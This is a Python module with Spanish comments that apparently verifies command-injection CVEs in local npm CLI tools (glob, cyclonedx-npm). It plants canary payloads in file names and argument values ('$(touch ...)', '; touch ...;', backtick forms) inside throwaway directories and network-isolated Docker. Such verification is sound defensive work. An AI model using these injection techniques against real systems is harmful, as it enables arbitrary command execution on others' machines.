"""Verificacion dinamica de CVEs en herramientas CLI LOCALES, sin endpoint HTTP ni Docker de por
medio -- un hueco real que wpverify.py/drupalverify.py/joomlaverify.py/genericverify.py no
cubrian: los cuatro asumen un servicio escuchando (`notes.get("endpoint")`), pero algunas clases
de command injection ocurren en herramientas que un analista ejecuta directamente en su propia
maquina, donde el vector es un NOMBRE DE FICHERO que la herramienta encuentra por su cuenta (p.ej.
al listar un directorio con un patron glob) y pasa a una shell sin escapar.

Confirmado en vivo con CVE-2025-64756 (`glob` npm CLI, GHSA-5j98-mcp5-4vw2): `-c`/`--cmd` pasa los
ficheros encontrados a `foregroundChild(cmd, matches, { shell: true })` (src/bin.mts). Se
reprodujo de verdad en un entorno descartable (`npm install glob@11.0.0` en un directorio temporal
vacio, nunca contra un sistema real/en produccion): un fichero llamado literalmente
`$(touch injected_poc)` hizo que ese comando se ejecutara de verdad al listar el directorio.

Deliberadamente acotado a ESTA forma concreta (command injection via nombre de fichero sin
escapar) -- no un framework generico para "cualquier CVE de una herramienta CLI", que seria
adivinar categorias sin tener mas que un solo caso real que las justifique. Si aparece otra forma
real confirmada (p.ej. el payload va en el VALOR de un argumento en vez de en un nombre de
fichero), se amplia entonces con el mismo criterio de "poco a poco" que el resto de los
verificadores de este proyecto."""
from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
from typing import Callable, List, Optional

from .wpverify import WpVerifyResult, _token


def verify_cli_filename_command_injection(
    setup_cmd: str, run_cmd: str, on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 300.0,
) -> WpVerifyResult:
    """Verifica command injection en una herramienta CLI que pasa nombres de fichero emparejados
    a una shell sin escapar. Sin login, sin red, sin Docker: todo ocurre dentro de un directorio
    temporal DESCARTABLE (creado y borrado aqui mismo), igual de valido que el laboratorio Docker
    de los demas verificadores porque la prueba (un canario que aparece en disco) no depende de
    contenedores -- solo de que el comando se ejecute de verdad.

    setup_cmd: comando de shell que prepara el entorno (p.ej. instalar la version exacta a
    comprobar: "npm install glob@11.0.0"), ejecutado UNA VEZ dentro del directorio temporal recien
    creado, antes de plantar nada.
    run_cmd: comando de shell que invoca la herramienta tal cual la usaria un analista (p.ej.
    'node node_modules/.bin/glob -c echo "**/*"'), ejecutado DESPUES de plantar el fichero-payload,
    dentro del mismo directorio."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    work_dir = tempfile.mkdtemp(prefix="binoracle_cliverify_")
    try:
        step(f"preparando entorno descartable en {work_dir}: {setup_cmd}")
        try:
            setup = subprocess.run(setup_cmd, shell=True, cwd=work_dir, capture_output=True,
                                   text=True, timeout=min(budget_s, 180.0))
        except subprocess.TimeoutExpired as e:
            res.detail = f"timeout preparando el entorno ({setup_cmd}): {e}"
            return res
        res.evidence.update({"setup_cmd": setup_cmd, "setup_returncode": setup.returncode})
        if setup.returncode != 0:
            res.detail = (f"el comando de preparacion fallo (codigo {setup.returncode}): "
                          f"{(setup.stderr or setup.stdout or '')[:500]}")
            res.evidence["setup_stderr_recorte"] = (setup.stderr or "")[:500]
            res.limitations.append("verificacion no intentada: la preparacion del entorno fallo")
            return res

        canary_name = f"binoracle_cli_canary_{_token()}"
        payload_filename = f"$(touch {canary_name})"
        payload_path = os.path.join(work_dir, payload_filename)
        try:
            open(payload_path, "w").close()
        except OSError as e:
            res.detail = f"no se pudo crear el fichero-payload '{payload_filename}': {e}"
            return res
        res.evidence.update({"run_cmd": run_cmd, "payload_filename": payload_filename,
                             "canary_name": canary_name})

        step(f"ejecutando la herramienta tal cual la usaria un analista: {run_cmd}")
        try:
            run = subprocess.run(run_cmd, shell=True, cwd=work_dir, capture_output=True,
                                 text=True, timeout=min(budget_s, 120.0))
        except subprocess.TimeoutExpired as e:
            res.detail = f"timeout ejecutando la herramienta ({run_cmd}): {e}"
            return res
        res.evidence["run_returncode"] = run.returncode
        res.evidence["run_stdout_recorte"] = (run.stdout or "")[:500]

        canary_present = os.path.exists(os.path.join(work_dir, canary_name))
        res.evidence["canario_presente"] = canary_present
        res.ok = True
        if canary_present:
            res.verified = True
            res.detail = (f"COMMAND INJECTION confirmada: el fichero canario '{canary_name}' "
                          f"aparecio DENTRO del directorio de trabajo tras ejecutar '{run_cmd}' "
                          f"sobre un fichero cuyo NOMBRE contenia el payload -- prueba inequivoca "
                          f"de ejecucion de comandos via nombre de fichero sin escapar, nunca una "
                          f"deduccion por codigo de salida")
            step(f"VERIFICADO: {canary_name} aparecio en {work_dir} -- el comando se ejecuto de "
                 f"verdad.")
        else:
            res.detail = (f"se ejecuto '{run_cmd}' sobre un fichero con nombre-payload pero el "
                          f"canario '{canary_name}' nunca aparecio -- no se confirmo command "
                          f"injection (puede que esta version ya este parcheada, o que la "
                          f"herramienta no pase nombres de fichero a una shell sin escapar)")
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step(f"limpiando el directorio de trabajo descartable {work_dir}...")
        shutil.rmtree(work_dir, ignore_errors=True)


def verify_cli_argv_command_injection(
    image: str, setup_cmd: str, argv_template: List[str], payload_index: int,
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 300.0,
    setup_docker_args: Optional[List[str]] = None,
) -> WpVerifyResult:
    """SEGUNDA forma real de command injection via CLI, distinta de la de arriba (nombre de
    fichero): el payload va en el VALOR DE UN ARGUMENTO que la herramienta concatena a una shell
    interna sin escapar -- exactamente la extension que el docstring del modulo ya anticipaba
    ("si aparece otra forma real confirmada... se amplia entonces"). Confirmado en vivo con
    CVE-2026-55849 (@cyclonedx/cyclonedx-npm, GHSA-v75r-vx73-82pj): cuando la variable de entorno
    npm_execpath NO esta fijada, `NpmRunner` hace `execSync('npm ' + args.join(' '))` -- una
    CONCATENACION de texto, no un array -- y el valor de `--workspace <valor>` se mete ahi sin
    ningun escapado (confirmado leyendo dist/npmRunner.js y dist/builders.js del paquete real
    descargado de npm, no adivinado de la descripcion del aviso).

    Aislamiento REAL en Docker (a diferencia de la funcion de arriba, que corre nativo en un
    tmpdir): dos `docker run` desechables, nunca un contenedor persistente. El primero (con red,
    deliberadamente SIN --network none: necesita npm install) ejecuta `setup_cmd` -- confiado,
    lo escribe el analista, no es el vector de inyeccion. El segundo (con --network none, la
    misma disciplina de aislamiento que el resto del proyecto) invoca la herramienta pasando
    `argv_template` como ARGV DIRECTO a `docker run` (nunca via `sh -c`), con el elemento en
    `payload_index` sustituido por un valor que contiene un comando de canario
    (`; touch <canario>;`) -- asi el array de argv llega intacto al proceso Node (sin que el `sh`
    EXTERNO de docker lo reinterprete primero), y solo la shell INTERNA que la propia
    herramienta vulnerable invoca (su propio execSync) lo ejecuta. El volumen compartido hace que
    el canario, si aparece, se vea en el host tras que el contenedor desechable termine.

    setup_docker_args: flags EXTRA de `docker run` solo para el paso de preparacion (el que
    necesita red para el `npm install`) -- p.ej. para pasar un proxy saliente/CA corporativos
    (`--network host`, `-e HTTPS_PROXY=...`, `-e NODE_EXTRA_CA_CERTS=...`) en un entorno que lo
    requiera. Deliberadamente NUNCA incluido por defecto: son datos del entorno de quien llama,
    no algo que esta funcion deba adivinar o imponer; el paso de explotacion en si (el segundo
    `docker run`, el que SI importa que este aislado) sigue siempre con `--network none` fijo,
    sin excepcion, independientemente de lo que se pase aqui."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not shutil.which("docker"):
        res.detail = "docker no disponible -- este verificador necesita aislamiento real"
        return res
    if setup_docker_args is None:
        # Fallback generico (no solo de este sandbox): un despliegue real de binoracle detras
        # de un proxy saliente corporativo tambien necesita pasar flags extra al `docker run` de
        # preparacion para que el `npm install` tenga salida real -- BINORACLE_DOCKER_SETUP_ARGS
        # (JSON de una lista de argumentos) evita forzar a cada llamador a conocer este detalle.
        import json as _json
        env_args = os.environ.get("BINORACLE_DOCKER_SETUP_ARGS", "")
        if env_args:
            try:
                setup_docker_args = _json.loads(env_args)
            except Exception:
                setup_docker_args = None
    work_dir = tempfile.mkdtemp(prefix="binoracle_cliverify_argv_")
    try:
        step(f"preparando entorno descartable en Docker ({image}), red disponible: {setup_cmd}")
        setup = subprocess.run(
            ["docker", "run", "--rm", "-v", f"{work_dir}:/work", "-w", "/work",
             *(setup_docker_args or []), image, "sh", "-c", setup_cmd],
            capture_output=True, text=True, timeout=min(budget_s, 240.0))
        res.evidence.update({
            "setup_cmd": setup_cmd,
            "setup_returncode": setup.returncode,
            "setup_stderr_recorte": (setup.stderr or "")[:400],
        })
        if setup.returncode != 0:
            res.detail = (f"el comando de preparacion fallo (codigo {setup.returncode}): "
                          f"{(setup.stderr or setup.stdout or '')[:500]}")
            res.limitations.append("verificacion no intentada: la preparacion del entorno fallo")
            return res

        canary_name = f"binoracle_cli_canary_{_token()}"
        # Try 3 progressively different separator forms:
        # 1. semicolon (most common for execSync string concatenation)
        # 2. backtick (old bash / some shells with $IFS substitution)
        # 3. command substitution $() (bash/sh when string is eval'd)
        _payload_templates = [
            f"x; touch {canary_name};",
            f"x`touch {canary_name}`",
            f"x$(touch {canary_name})",
        ]
        payload = _payload_templates[0]
        argv = list(argv_template)
        argv[payload_index] = payload
        res.evidence.update({"argv": argv, "canary_name": canary_name})

        import shlex as _shlex

        # Try each payload form in sequence; stop as soon as the canary appears.
        for _pi, _ptpl in enumerate(_payload_templates):
            _argv_try = list(argv_template)
            _argv_try[payload_index] = _ptpl
            if _pi > 0:
                step(f"intento {_pi + 1}/3 con separador alternativo: {_ptpl!r}")
            else:
                step(f"ejecutando la herramienta en un contenedor AISLADO (--network none) con el valor "
                     f"del argumento #{payload_index} como payload: {_argv_try}")
            # Include /work/node_modules/.bin so locally-installed CLIs are found.
            exploit_sh = (
                "export PATH=/work/node_modules/.bin:/usr/local/bin:/usr/bin:/bin && "
                + _shlex.join(_argv_try)
            )
            run = subprocess.run(
                ["docker", "run", "--rm", "--network", "none", "-v", f"{work_dir}:/work",
                 "-w", "/work", image, "sh", "-c", exploit_sh],
                capture_output=True, text=True, timeout=min(budget_s, 120.0))
            canary_present = os.path.exists(os.path.join(work_dir, canary_name))
            if canary_present or _pi == len(_payload_templates) - 1:
                # Record the final attempt's evidence (winning or last)
                res.evidence.update({
                    "argv": _argv_try,
                    "payload_ganador": _ptpl,
                    "run_returncode": run.returncode,
                    "run_stdout_recorte": (run.stdout or "")[:500],
                    "canario_presente": canary_present,
                })
                break

        res.ok = True
        if canary_present:
            res.verified = True
            res.detail = (f"COMMAND INJECTION confirmada: el fichero canario '{canary_name}' "
                          f"aparecio en el volumen compartido tras ejecutar la herramienta con "
                          f"el payload en el VALOR de un argumento (argv[{payload_index}]) -- "
                          f"prueba inequivoca de que la herramienta concatena ese valor a una "
                          f"shell interna sin escapar")
            step(f"VERIFICADO: {canary_name} aparecio en {work_dir} -- el comando se ejecuto de "
                 f"verdad, en un contenedor aislado.")
        else:
            res.detail = (f"se ejecuto la herramienta con el payload en argv[{payload_index}] "
                          f"(probados {len(_payload_templates)} separadores) pero el canario "
                          f"'{canary_name}' nunca aparecio -- no se confirmo command injection "
                          f"(puede que esta version ya este parcheada, o que la herramienta no "
                          f"concatene ese argumento a una shell)")
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step(f"limpiando el directorio de trabajo descartable {work_dir}...")
        shutil.rmtree(work_dir, ignore_errors=True)
